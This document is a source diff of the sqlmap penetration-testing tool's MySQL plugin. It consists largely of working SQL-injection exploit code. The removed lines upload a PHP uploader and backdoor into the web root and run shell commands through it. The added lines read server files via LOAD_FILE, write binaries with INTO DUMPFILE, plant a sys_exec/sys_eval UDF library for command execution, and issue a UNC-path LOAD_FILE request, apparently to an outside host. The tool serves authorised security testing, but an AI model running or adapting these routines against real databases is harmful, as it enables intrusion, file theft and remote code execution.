@@ -5,8 +5,8 @@ $Id$
 
 This file is part of the sqlmap project, http://sqlmap.sourceforge.net.
 
-Copyright (c) 2006-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
-                        and Daniele Bellucci <daniele.bellucci@gmail.com>
+Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
+Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>
 
 sqlmap is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -24,43 +24,52 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 
 
+import os
 import re
 
 from lib.core.agent import agent
 from lib.core.common import fileToStr
 from lib.core.common import formatDBMSfp
 from lib.core.common import formatFingerprint
-from lib.core.common import getDirectories
 from lib.core.common import getHtmlErrorFp
 from lib.core.common import randomInt
+from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import paths
+from lib.core.exception import sqlmapNoneDataException
 from lib.core.exception import sqlmapSyntaxException
 from lib.core.session import setDbms
 from lib.core.settings import MYSQL_ALIASES
 from lib.core.settings import MYSQL_SYSTEM_DBS
-from lib.core.shell import autoCompletion
 from lib.core.unescaper import unescaper
 from lib.request import inject
 from lib.request.connect import Connect as Request
+from lib.techniques.inband.union.test import unionTest
+from lib.techniques.inband.union.use import unionUse
+from lib.techniques.outband.stacked import stackedTest
 
 from plugins.generic.enumeration import Enumeration
 from plugins.generic.filesystem import Filesystem
 from plugins.generic.fingerprint import Fingerprint
+from plugins.generic.misc import Miscellaneous
 from plugins.generic.takeover import Takeover
 
 
-class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
+class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
     """
     This class defines MySQL methods
     """
 
     def __init__(self):
-        self.excludeDbsList = MYSQL_SYSTEM_DBS
+        self.__basedir        = None
+        self.excludeDbsList   = MYSQL_SYSTEM_DBS
+
         Enumeration.__init__(self, "MySQL")
+        Filesystem.__init__(self)
+        Takeover.__init__(self)
 
         unescaper.setUnescape(MySQLMap.unescape)
 
@@ -125,8 +134,8 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
 
 
     def __commentCheck(self):
-        logMsg = "executing MySQL comment injection fingerprint"
-        logger.info(logMsg)
+        infoMsg = "executing MySQL comment injection fingerprint"
+        logger.info(infoMsg)
 
         query   = agent.prefixQuery(" /* NoValue */")
         query   = agent.postfixQuery(query)
@@ -139,14 +148,14 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
 
             return None
 
-        # MySQL valid versions updated at 10/2008
+        # MySQL valid versions updated on 02/2009
         versions = (
                      (32200, 32233),    # MySQL 3.22
                      (32300, 32359),    # MySQL 3.23
                      (40000, 40031),    # MySQL 4.0
-                     (40100, 40125),    # MySQL 4.1
-                     (50000, 50074),    # MySQL 5.0
-                     (50100, 50131),    # MySQL 5.1
+                     (40100, 40122),    # MySQL 4.1
+                     (50000, 50077),    # MySQL 5.0
+                     (50100, 50132),    # MySQL 5.1
                      (60000, 60009),    # MySQL 6.0
                    )
 
@@ -186,7 +195,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
         if wsOsFp:
             value += "%s\n" % wsOsFp
 
-        if self.banner:
+        if kb.data.banner:
             dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)
 
             if dbmsOsFp:
@@ -199,19 +208,19 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
             value += actVer
             return value
 
-        comVer      = self.__commentCheck()
-        blank       = " " * 15
-        value      += "active fingerprint: %s" % actVer
+        # TODO: comment injection fingerprint is broken, fix
+        comVer = self.__commentCheck()
+        blank  = " " * 15
+        value += "active fingerprint: %s" % actVer
 
         if comVer:
             comVer = formatDBMSfp([comVer])
             value += "\n%scomment injection fingerprint: %s" % (blank, comVer)
 
         if kb.bannerFp:
-            # TODO: move to the XML banner file
             banVer = kb.bannerFp["dbmsVersion"]
 
-            if re.search("-log$", self.banner):
+            if re.search("-log$", kb.data.banner):
                 banVer += ", logging enabled"
 
             banVer = formatDBMSfp([banVer])
@@ -238,15 +247,15 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
             setDbms("MySQL %s" % kb.dbmsVersion[0])
 
             if int(kb.dbmsVersion[0]) >= 5:
-                self.has_information_schema = True
+                kb.data.has_information_schema = True
 
-            self.getPrematureBanner("VERSION()")
+            self.getBanner()
 
             if not conf.extensiveFp:
                 return True
 
-        logMsg = "testing MySQL"
-        logger.info(logMsg)
+        infoMsg = "testing MySQL"
+        logger.info(infoMsg)
 
         randInt = str(randomInt(1))
 
@@ -254,8 +263,8 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
         result  = Request.queryPage(payload)
 
         if result == True:
-            logMsg = "confirming MySQL"
-            logger.info(logMsg)
+            infoMsg = "confirming MySQL"
+            logger.info(infoMsg)
 
             payload = agent.fullPayload(" AND ISNULL(1/0)")
             result  = Request.queryPage(payload)
@@ -267,38 +276,32 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
                 return False
 
             # Determine if it is MySQL >= 5.0.0
-            if inject.getValue("SELECT %s FROM information_schema.TABLES LIMIT 0, 1" % randInt) == randInt:
-                setDbms("MySQL 5")
-                self.has_information_schema = True
+            if inject.getValue("SELECT %s FROM information_schema.TABLES LIMIT 0, 1" % randInt, charsetType=2) == randInt:
+                kb.data.has_information_schema = True
+                kb.dbmsVersion = [">= 5.0.0"]
 
-                self.getPrematureBanner("VERSION()")
+                setDbms("MySQL 5")
+
+                self.getBanner()
 
                 if not conf.extensiveFp:
-                    kb.dbmsVersion = [">= 5.0.0"]
                     return True
 
-                # Check if it is MySQL >= 6.0.3
-                if inject.getValue("SELECT %s FROM information_schema.PARAMETERS LIMIT 0, 1" % randInt) == randInt:
-                    if inject.getValue("SELECT %s FROM information_schema.PROFILING LIMIT 0, 1" % randInt) == randInt:
-                        kb.dbmsVersion = [">= 6.0.5"]
-                    else:
-                        kb.dbmsVersion = [">= 6.0.3", "< 6.0.5"]
-
-                # Or if it MySQL >= 5.1.2 and < 6.0.3
-                elif inject.getValue("MID(@@table_open_cache, 1, 1)"):
-                    if inject.getValue("SELECT %s FROM information_schema.PROCESSLIST LIMIT 0, 1" % randInt) == randInt:
-                        kb.dbmsVersion = [">= 5.1.7", "< 6.0.3"]
-                    elif inject.getValue("SELECT %s FROM information_schema.PARTITIONS LIMIT 0, 1" % randInt) == randInt:
+                # Check if it is MySQL >= 5.1.2
+                if inject.getValue("MID(@@table_open_cache, 1, 1)", unpack=False):
+                    if inject.getValue("SELECT %s FROM information_schema.PROCESSLIST LIMIT 0, 1" % randInt, unpack=False, charsetType=2) == randInt:
+                        kb.dbmsVersion = [">= 5.1.7"]
+                    elif inject.getValue("SELECT %s FROM information_schema.PARTITIONS LIMIT 0, 1" % randInt, unpack=False, charsetType=2) == randInt:
                         kb.dbmsVersion = ["= 5.1.6"]
-                    elif inject.getValue("SELECT %s FROM information_schema.PLUGINS LIMIT 0, 1" % randInt) == randInt:
+                    elif inject.getValue("SELECT %s FROM information_schema.PLUGINS LIMIT 0, 1" % randInt, unpack=False, charsetType=2) == randInt:
                         kb.dbmsVersion = [">= 5.1.5", "< 5.1.6"]
                     else:
                         kb.dbmsVersion = [">= 5.1.2", "< 5.1.5"]
 
                 # Or if it is MySQL >= 5.0.0 and < 5.1.2
-                elif inject.getValue("MID(@@hostname, 1, 1)"):
+                elif inject.getValue("MID(@@hostname, 1, 1)", unpack=False):
                     kb.dbmsVersion = [">= 5.0.38", "< 5.1.2"]
-                elif inject.getValue("SELECT 1 FROM DUAL") == "1":
+                elif inject.getValue("SELECT 1 FROM DUAL", charsetType=1) == "1":
                     kb.dbmsVersion = [">= 5.0.11", "< 5.0.38"]
                 elif inject.getValue("DATABASE() LIKE SCHEMA()"):
                     kb.dbmsVersion = [">= 5.0.2", "< 5.0.11"]
@@ -307,10 +310,11 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
 
             # Otherwise assume it is MySQL < 5.0.0
             else:
-                setDbms("MySQL 4")
                 kb.dbmsVersion = ["< 5.0.0"]
 
-                self.getPrematureBanner("VERSION()")
+                setDbms("MySQL 4")
+
+                self.getBanner()
 
                 if not conf.extensiveFp:
                     return True
@@ -329,7 +333,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
                         kb.dbmsVersion = ["= 4.1.0"]
                     else:
                         kb.dbmsVersion = [">= 4.0.6", "< 4.1.0"]
-                elif inject.getValue("FOUND_ROWS()") == "0":
+                elif inject.getValue("FOUND_ROWS()", charsetType=1) == "0":
                     kb.dbmsVersion = [">= 4.0.0", "< 4.0.6"]
                 elif inject.getValue("CONNECTION_ID()"):
                     kb.dbmsVersion = [">= 3.23.14", "< 4.0.0"]
@@ -346,181 +350,261 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
             return False
 
 
-    def readFile(self, rFile):
-        logMsg = "fetching file: '%s'" % rFile
-        logger.info(logMsg)
+    def checkDbmsOs(self, detailed=False):
+        if kb.os:
+            return
 
-        return inject.getValue("LOAD_FILE('%s')" % rFile)
+        infoMsg = "fingerprinting the back-end DBMS operating system"
+        logger.info(infoMsg)
 
+        self.createSupportTbl(self.fileTblName, self.tblField, "text")
+        inject.goStacked("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, "VERSION()"))
 
-    def osShell(self):
-        """
-        This method is used to write a PHP agent (cmd.php) on a writable
-        remote directory within the web server document root.
-        Such agent is written using the INTO OUTFILE MySQL DBMS
-        functionality
+        datadirSubstr = inject.getValue("SELECT MID(@@datadir, 1, 1)", unpack=False)
 
-        @todo: * Add a web application crawling functionality to detect
-               all (at least most) web server directories and merge with
-               Google results if the target host is a publicly available
-               hostname or IP address;
-               * Extend to all DBMS using their functionalities (UDF, stored
-               procedures, etc) to write files on the system or directly
-               execute commands on the system without passing by the agent;
-               * Automatically detect the web server available interpreters
-               parsing 'Server', 'X-Powered-By' and 'X-AspNet-Version' HTTP
-               response headers;
-               * Extend the agent to other interpreters rather than only PHP:
-               ASP, JSP, CGI (Python, Perl, Ruby, Bash).
-        """
-
-        logMsg  = "retrieving web application directories"
-        logger.info(logMsg)
-
-        directories = getDirectories()
-
-        if directories:
-            logMsg  = "retrieved web server directories "
-            logMsg += "'%s'" % ", ".join(d for d in directories)
-            logger.info(logMsg)
-
-            message  = "in addition you can provide a list of directories "
-            message += "absolute path comma separated that you want sqlmap "
-            message += "to try to upload the agent [/var/www/test]: "
-            inputDirs = readInput(message, default="/var/www/test")
+        if datadirSubstr == "/":
+            kb.os = "Linux"
         else:
-            message = "please provide the web server document root [/var/www]: "
-            inputDocRoot = readInput(message, default="/var/www")
+            kb.os = "Windows"
 
-            if inputDocRoot:
-                kb.docRoot = inputDocRoot
-            else:
-                kb.docRoot = "/var/www"
+        infoMsg = "the back-end DBMS operating system is %s" % kb.os
+        logger.info(infoMsg)
 
-            message  = "please provide a list of directories absolute path "
-            message += "comma separated that you want sqlmap to try to "
-            message += "upload the agent [/var/www/test]: "
-            inputDirs = readInput(message, default="/var/www/test")
+        if detailed == False:
+            self.cleanup(onlyFileTbl=True)
 
-        if inputDirs:
-            inputDirs = inputDirs.replace(", ", ",")
-            inputDirs = inputDirs.split(",")
+            return
 
-            for inputDir in inputDirs:
-                directories.add(inputDir)
+        self.cleanup(onlyFileTbl=True)
+
+
+    def unionReadFile(self, rFile):
+        infoMsg = "fetching file: '%s'" % rFile
+        logger.info(infoMsg)
+
+        result = inject.getValue("SELECT HEX(LOAD_FILE('%s'))" % rFile)
+
+        return result
+
+
+    def stackedReadFile(self, rFile):
+        infoMsg = "fetching file: '%s'" % rFile
+        logger.info(infoMsg)
+
+        self.createSupportTbl(self.fileTblName, self.tblField, "longtext")
+        self.getRemoteTempPath()
+
+        tmpFile = "%s/sqlmapfilehex%s" % (conf.tmpPath, randomStr(lowercase=True))
+
+        debugMsg  = "saving hexadecimal encoded content of file '%s' " % rFile
+        debugMsg += "into temporary file '%s'" % tmpFile
+        logger.debug(debugMsg)
+        inject.goStacked("SELECT HEX(LOAD_FILE('%s')) INTO DUMPFILE '%s'" % (rFile, tmpFile))
+
+        debugMsg  = "loading the content of hexadecimal encoded file "
+        debugMsg += "'%s' into support table" % rFile
+        logger.debug(debugMsg)
+        inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))
+
+        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), sort=False, resumeValue=False, charsetType=2)
+
+        if not length.isdigit() or not len(length) or length in ( "0", "1" ):
+            errMsg  = "unable to retrieve the content of the "
+            errMsg += "file '%s'" % rFile
+            raise sqlmapNoneDataException, errMsg
+
+        length   = int(length)
+        sustrLen = 1024
+
+        if length > sustrLen:
+            result = []
+
+            for i in range(1, length, sustrLen):
+                chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, sustrLen, self.fileTblName), unpack=False, sort=False, resumeValue=False, charsetType=3)
+
+                result.append(chunk)
         else:
-            directories.add("/var/www/test")
+            result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), sort=False, resumeValue=False, charsetType=3)
 
-        logMsg  = "trying to upload the uploader agent"
-        logger.info(logMsg)
+        return result
 
-        directories = list(directories)
-        directories.sort()
-        uploaded = False
 
-        backdoorName = "backdoor.php"
-        backdoorPath = "%s/%s" % (paths.SQLMAP_SHELL_PATH, backdoorName)
-        uploaderName = "uploader.php"
-        uploaderStr  = fileToStr("%s/%s" % (paths.SQLMAP_SHELL_PATH, uploaderName))
+    def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
+        logger.debug("encoding file to its hexadecimal string value")
 
-        for directory in directories:
-            if uploaded:
-                break
+        fcEncodedList   = self.fileEncode(wFile, "hex", True)
+        fcEncodedStr    = fcEncodedList[0]
+        fcEncodedStrLen = len(fcEncodedStr)
 
-            # Upload the uploader agent
-            uploaderQuery = uploaderStr.replace("WRITABLE_DIR", directory)
-            query  = " LIMIT 1 INTO OUTFILE '%s/%s' " % (directory, uploaderName)
-            query += "LINES TERMINATED BY '\\n%s\\n'--" % uploaderQuery
+        if kb.injPlace == "GET" and fcEncodedStrLen > 8000:
+            warnMsg  = "the injection is on a GET parameter and the file "
+            warnMsg += "to be written hexadecimal value is %d " % fcEncodedStrLen
+            warnMsg += "bytes, this might cause errors in the file "
+            warnMsg += "writing process"
+            logger.warn(warnMsg)
 
-            query = agent.prefixQuery(" %s" % query)
-            query = agent.postfixQuery(query)
+        unionTest()
 
-            payload = agent.payload(newValue=query)
-            page = Request.queryPage(payload)
+        oldParamFalseCond   = conf.paramFalseCond
+        conf.paramFalseCond = True
 
-            if kb.docRoot:
-                requestDir = directory.replace(kb.docRoot, "")
+        debugMsg = "exporting the %s file content to file '%s'" % (fileType, dFile)
+        logger.debug(debugMsg)
+
+        sqlQuery = "%s INTO DUMPFILE '%s'" % (fcEncodedStr, dFile)
+        unionUse(sqlQuery, direct=True, unescape=False, nullChar="''")
+
+        conf.paramFalseCond = oldParamFalseCond
+
+        if confirm == True:
+            self.askCheckWrittenFile(wFile, dFile, fileType)
+
+
+    def stackedWriteFile(self, wFile, dFile, fileType, confirm=True):
+        debugMsg  = "creating a support table to write the hexadecimal "
+        debugMsg += "encoded file to"
+        logger.debug(debugMsg)
+
+        self.createSupportTbl(self.fileTblName, self.tblField, "longblob")
+
+        logger.debug("encoding file to its hexadecimal string value")
+        fcEncodedList = self.fileEncode(wFile, "hex", False)
+
+        debugMsg  = "forging SQL statements to write the hexadecimal "
+        debugMsg += "encoded file to the support table"
+        logger.debug(debugMsg)
+
+        sqlQueries = self.fileToSqlQueries(fcEncodedList)
+
+        logger.debug("inserting the hexadecimal encoded file to the support table")
+
+        for sqlQuery in sqlQueries:
+            inject.goStacked(sqlQuery)
+
+        debugMsg = "exporting the %s file content to file '%s'" % (fileType, dFile)
+        logger.debug(debugMsg)
+
+        # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
+        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, dFile))
+
+        if confirm == True:
+            self.askCheckWrittenFile(wFile, dFile, fileType)
+
+
+    def udfInit(self):
+        self.getVersionFromBanner()
+
+        banVer = kb.bannerFp["dbmsVersion"]
+        dFile  = None
+        wFile  = paths.SQLMAP_UDF_PATH
+        lib    = "libsqlmapudf%s" % randomStr(lowercase=True)
+
+        if kb.os == "Windows":
+            wFile += "/mysql/windows/lib_mysqludf_sys.dll"
+            libExt = "dll"
+        else:
+            wFile += "/mysql/linux/lib_mysqludf_sys.so"
+            libExt = "so"
+
+        for udf in ( "sys_exec", "sys_eval" ):
+            if udf in self.createdUdf:
+                continue
+
+            logger.info("checking if %s UDF already exist" % udf)
+
+            query  = agent.forgeCaseStatement("(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0, 1)='%s'" % (udf, udf))
+            exists = inject.getValue(query, resumeValue=False, unpack=False)
+
+            if exists == "1":
+                message  = "%s UDF already exists, do you " % udf
+                message += "want to overwrite it? [y/N] "
+                output   = readInput(message, default="N")
+
+                if output and output in ("y", "Y"):
+                    self.udfToCreate.add(udf)
             else:
-                requestDir = directory
+                self.udfToCreate.add(udf)
 
-            baseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
-            uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
-            page, _ = Request.getPage(url=uploaderUrl, direct=True)
+        if len(self.udfToCreate) > 0:
+            # On Windows
+            if kb.os == "Windows":
+                # On MySQL 5.1 >= 5.1.19 and on any version of MySQL 6.0
+                if banVer >= "5.1.19":
+                    if self.__basedir == None:
+                        logger.info("retrieving MySQL base directory absolute path")
 
-            if "sqlmap backdoor uploader" not in page:
-                warnMsg  = "unable to upload the uploader "
-                warnMsg += "agent on '%s'" % directory
-                logger.warn(warnMsg)
+                        # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
+                        self.__basedir = inject.getValue("SELECT @@basedir")
+                        self.__basedir = os.path.normpath(self.__basedir.replace("\\", "/"))
 
-                continue
+                        if re.search("^[\w]\:[\/\\\\]+", self.__basedir, re.I):
+                            kb.os = "Windows"
 
-            logMsg  = "the uploader agent has been successfully uploaded "
-            logMsg += "on '%s'" % directory
-            logger.info(logMsg)
+                        # The DLL must be in C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin
+                        dFile = "%s/lib/plugin/%s.%s" % (self.__basedir, lib, libExt)
 
-            # Upload the backdoor through the uploader agent
-            multipartParams = {
-                                "upload":    "1",
-                                "file":      open(backdoorPath, "r"),
-                                "uploadDir": directory,
-                              }
-            uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
-            page = Request.getPage(url=uploaderUrl, multipart=multipartParams)
+                    logger.warn("this will only work if the database administrator created manually the '%s/lib/plugin' subfolder" % self.__basedir)
 
-            if "Backdoor uploaded" not in page:
-                warnMsg  = "unable to upload the backdoor through "
-                warnMsg += "the uploader agent on '%s'" % directory
-                logger.warn(warnMsg)
-
-                continue
-
-            uploaded = True
-
-            backdoorUrl = "%s/%s" % (baseUrl, backdoorName)
-            logMsg  = "the backdoor has been successfully uploaded on "
-            logMsg += "'%s', go with your browser to " % directory
-            logMsg += "'%s' and enjoy it!" % backdoorUrl
-            logger.info(logMsg)
-
-            message  = "do you want to use the uploaded backdoor as a "
-            message += "shell to execute commands right now? [Y/n] "
-            shell = readInput(message, default="Y")
-
-            if shell in ("n", "N"):
-                continue
-
-            logMsg  = "calling OS shell. To quit type "
-            logMsg += "'x' or 'q' and press ENTER"
-            logger.info(logMsg)
-
-            autoCompletion(osShell=True)
-
-            while True:
-                command = None
-
-                try:
-                    command = raw_input("$ ")
-                except KeyboardInterrupt:
-                    print
-                    errMsg = "user aborted"
-                    logger.error(errMsg)
-                except EOFError:
-                    print
-                    errMsg = "exit"
-                    logger.error(errMsg)
-                    break
-
-                if not command:
-                    continue
-
-                if command.lower() in ( "x", "q", "exit", "quit" ):
-                    break
-
-                cmdUrl = "%s?cmd=%s" % (backdoorUrl, command)
-                page, _ = Request.getPage(url=cmdUrl, direct=True)
-                output = re.search("<pre>(.+?)</pre>", page, re.I | re.S)
-
-                if output:
-                    print output.group(1)
+                # On MySQL 4.1 < 4.1.25 and on MySQL 4.1 >= 4.1.25 with NO plugin_dir set in my.ini configuration file
+                # On MySQL 5.0 < 5.0.67 and on MySQL 5.0 >= 5.0.67 with NO plugin_dir set in my.ini configuration file
                 else:
-                    print "No output"
+                    #logger.debug("retrieving MySQL data directory absolute path")
+
+                    # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_datadir
+                    #datadir = inject.getValue("SELECT @@datadir")
+
+                    # NOTE: specifying the relative path as './udf.dll'
+                    # saves in @@datadir on both MySQL 4.1 and MySQL 5.0
+                    datadir = "."
+                    datadir = os.path.normpath(datadir.replace("\\", "/"))
+
+                    if re.search("[\w]\:\/", datadir, re.I):
+                        kb.os = "Windows"
+
+                    # The DLL can be in either C:\WINDOWS, C:\WINDOWS\system,
+                    # C:\WINDOWS\system32, @@basedir\bin or @@datadir
+                    dFile = "%s/%s.%s" % (datadir, lib, libExt)
+
+            # On Linux
+            else:
+                # The SO can be in either /lib, /usr/lib or one of the
+                # paths specified in /etc/ld.so.conf file, none of these
+                # paths are writable by mysql user by default
+                # TODO: test with plugins folder on MySQL >= 5.1.19
+                dFile = "/usr/lib/%s.%s" % (lib, libExt)
+
+            self.writeFile(wFile, dFile, "binary", False)
+
+        for udf, retType in ( ( "sys_exec", "int" ), ( "sys_eval", "string" ) ):
+            if udf in self.createdUdf:
+                continue
+
+            if udf in self.udfToCreate:
+                logger.info("creating %s UDF from the binary UDF file" % udf)
+
+                # Reference: http://dev.mysql.com/doc/refman/5.1/en/create-function-udf.html
+                inject.goStacked("DROP FUNCTION %s" % udf)
+                inject.goStacked("CREATE FUNCTION %s RETURNS %s SONAME '%s.%s'" % (udf, retType, lib, libExt))
+            else:
+                logger.debug("keeping existing %s UDF as requested" % udf)
+
+            self.createdUdf.add(udf)
+
+        self.envInitialized = True
+
+        debugMsg  = "creating a support table to write commands standard "
+        debugMsg += "output to"
+        logger.debug(debugMsg)
+
+        self.createSupportTbl(self.cmdTblName, self.tblField, "longtext")
+
+
+    def uncPathRequest(self):
+        if kb.stackedTest == False:
+            query   = agent.prefixQuery(" AND LOAD_FILE('%s')" % self.uncPath)
+            query   = agent.postfixQuery(query)
+            payload = agent.payload(newValue=query)
+
+            Request.queryPage(payload)
+        else:
+            inject.goStacked("SELECT LOAD_FILE('%s')" % self.uncPath, silent=True)
